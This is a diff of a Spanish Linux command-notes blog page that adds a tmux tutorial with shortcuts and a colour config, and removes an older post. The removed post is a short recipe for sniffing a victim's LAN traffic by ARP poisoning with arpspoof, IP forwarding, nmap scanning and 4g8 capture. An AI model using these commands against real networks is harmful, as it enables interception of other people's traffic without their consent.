@@ -9,7 +9,7 @@
   <meta name="author" content="templix">
 
   
-  <meta name="description" content="Conversor de unidades [metros, litros, millas, pulgadas, grados&#8230;]. Las unidades han de expresarse en inglés. $ units Muestra &#8220;You have&# &hellip;">
+  <meta name="description" content="Terminal multiplexor $ tmux (Lanzar la aplicación) $ tmux ls (Listar las sesiones tmux abiertas) $ tmux attach -t 0 (Sincronizarse con la sesión 0 [ &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -74,6 +74,170 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/tmux/">Tmux</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-01-22T20:45:00+01:00" pubdate data-updated="true">22-01-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Terminal multiplexor</p>
+
+<blockquote><p>$ tmux (Lanzar la aplicación)</p>
+
+<p>$ tmux ls (Listar las sesiones tmux abiertas)</p>
+
+<p>$ tmux attach -t 0 (Sincronizarse con la sesión 0 [attach] en local o en remoto via ssh)</p>
+
+<p>$ tmux rename-session -t 0 tty1 (Renombrar la sesion 0 a tty1)</p>
+
+<p>$ tmux kill-window -t 2 (Matar la sesión tmux número 2)</p>
+
+<p>$ tmux new-session -s hack_wifi (Abrir sesión con un nombre)</p>
+
+<p>$ tmux list-commands (Listar la sintaxis de todos los comandos soportados)</p>
+
+<p>$ tmux list-keys (Listado de todas las teclas de control)</p>
+
+<p>$ tmux new-session -d &#8216;vi /etc/apt/sources.list&#8217; \; split-window -d &#8216;newsbeuter&#8217; \; attach (Arrancar una sesión tmux con el sources.list en el panel superior y con el lector RSS newsbeuter en el inferior)</p>
+
+<p>$ tmux new-session \; split-window \; split-window -h \; split-window -v \; attach (Arrancar la aplicación con varios panels horizontales y verticales)</p></blockquote>
+
+<p>Un completo tutorial en: <a href="http://www.openbsd.org/cgi-bin/man.cgi?query=tmux&amp;sektion=1">http://www.openbsd.org/cgi-bin/man.cgi?query=tmux&amp;sektion=1</a></p>
+
+<p>Atajos:</p>
+
+<pre><code>Ctrl+b c (Crear una nueva ventana)
+
+Ctrl+b d (Salir de tmux actual (detach) sin cerrar sesión)
+
+Ctrl+b n (Ir a la ventana siguiente)
+
+Ctrl+b p (Ir a la ventana anterior)
+
+Ctrl+b &amp; (Matar la ventana actual, incluye todos los paneles)
+
+Ctrl+b x (Matar panel actual)
+
+Ctrl+b , (cambiar el nombre de la ventana actual )
+
+Ctrl+b % (Dividir verticalmente la ventana actual en dos paneles)
+
+Ctrl+b " (Dividir horizontalmente la ventana actual en dos paneles)
+
+Ctrl+b q (Mostrar brevemente los números de cada panel)
+
+Ctrl+b o (Cambiar al siguiente panel)
+
+Ctrl+b ? (Lista todas las combinaciones de teclas de control)
+
+Ctrl+b w (Lista todas las ventanas)
+
+Ctrl+b núm (Moverse a la ventana seleccionada (0-9). No al panel)
+
+Ctrl+b up (Ir al panel de encima)
+
+Ctrl+b down (Ir al panel de abajo)
+
+Ctrl+b left (Ir al panel de la izquierda)
+
+Ctrl+b right (Ir al panel de la derecha)
+
+Ctrl+b t (Muestra en el panel un reloj digital)
+
+Ctrl+b s (Elegir sesión)
+
+Ctrl+b [ (Entra en modo scroll con la teclas del cursor. Termina pulsando q)
+</code></pre>
+
+<p>1.-</p>
+
+<p>Muestra para colorear los paneles:</p>
+
+<p>Crear en el directorio personal el archivo:</p>
+
+<blockquote><p>$ touch tmux.conf</p></blockquote>
+
+<p>Con el siguiente contenido [modificar al gusto]</p>
+
+<pre><code># default statusbar colors
+
+set -g status-fg colour136
+
+set -g status-bg colour235
+
+set -g status-attr default
+
+# default window title colors
+
+setw -g window-status-fg colour244
+
+setw -g window-status-bg default
+
+setw -g window-status-attr dim
+
+# active window title colors
+
+setw -g window-status-current-fg colour166
+
+setw -g window-status-current-bg default
+
+#setw -g window-status-current-attr bright
+
+setw -g window-status-current-attr underscore
+
+# panel border
+
+set-option -g pane-border-fg white #base02
+
+set-option -g pane-active-border-fg colour46 #base01
+
+# command/message line colors
+
+set -g message-fg white
+
+set -g message-bg black
+
+set -g message-attr bright
+
+# pane number display
+
+set-option -g display-panes-active-colour colour33 #blue
+
+set-option -g display-panes-colour colour166 #orange
+
+# clock
+
+set-window-option -g clock-mode-colour colour64 #green
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1165,70 +1329,6 @@ done
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/4g8/">4g8</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-01-06T13:38:00+01:00" pubdate data-updated="true">06-01-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Capturar paquetes de equipos de una red. Previamente preparar el equipo con los pasos previos para el envenenamiento arp lanzando en dos terminales y sin cerrarlas hasta terminar la captura:</p>
-
-<blockquote><p># arpspoof -i eth0 -t 192.168.1.12 192.168.1.1</p>
-
-<p># arpspoof -i eth0 -t 192.168.1.1 192.168.1.12</p></blockquote>
-
-<p>El “12” el sniffado, el “1” el router y el -i … la red. El paquete que contiene arpspoof es dsniff. Activar forwarding para que los paquetes vayan a su verdadero dueño:</p>
-
-<blockquote><p># echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
-
-<p>Para conocer los parámetros [ips y MACs] que luego tendremos que entrar en 4g8 lanzar:</p>
-
-<blockquote><p># nmap 192.168.1.0/24</p></blockquote>
-
-<p>Para conocer los equipos de la red. Una vez escogida la victima, lanzar 4g8:</p>
-
-<blockquote><p># 4g8 -i eth0 -g 192.168.1.1 -G 64:69:0C:87:A8:DC -s 192.168.1.12 -S 00:19:01:54:F5:1F -w dump.pcap</p></blockquote>
-
-<p>-g (la ip del router)</p>
-
-<p>-G (la MAC del router)</p>
-
-<p>-s (la ip de la victima)</p>
-
-<p>-S (la MAC de la victima)</p>
-
-<p>-w (el archivo donde guardar las capturas)</p>
-
-<p>Para el análisis del archivo dump.pcap  puedes usar wireshark entre otros.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/blog/page/2/">&larr; Older</a>
@@ -1248,6 +1348,10 @@ done
 <section>
   <h1>Añadidos/modificados</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/tmux/">tmux</a>
+      </li>
     
       <li class="post">
         <a href="/blog/units/">units</a>
@@ -1283,10 +1387,6 @@ done
     
       <li class="post">
         <a href="/blog/select/">select</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/4g8/">4g8</a>
       </li>
     
   </ul>
